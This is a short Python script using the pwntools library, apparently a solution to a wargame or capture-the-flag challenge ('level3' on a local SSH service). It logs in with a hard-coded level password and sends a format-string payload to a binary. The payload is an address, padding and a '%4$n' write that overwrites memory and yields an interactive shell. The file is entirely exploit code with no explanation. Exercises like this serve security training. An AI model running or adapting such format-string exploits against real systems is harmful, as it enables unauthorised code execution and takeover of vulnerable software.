#!/usr/bin/env python

from pwn import *

host = "127.0.0.1"
port = 4242

login = "level3" 
binary = login
password = "492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02" 
remotebinary = "/home/user/%s/%s" % (login, binary)

shell = ssh(host=host, port=port, user=login, password=password)


######  EXPLOIT  #####

padding = b"B"*60
m_addr = p32(0x0804988c)
payload = m_addr + padding + b"%4$n"

print("# Sending")
p = shell.process([remotebinary], env={})
p.sendline(payload)

# p.clean()

p.interactive()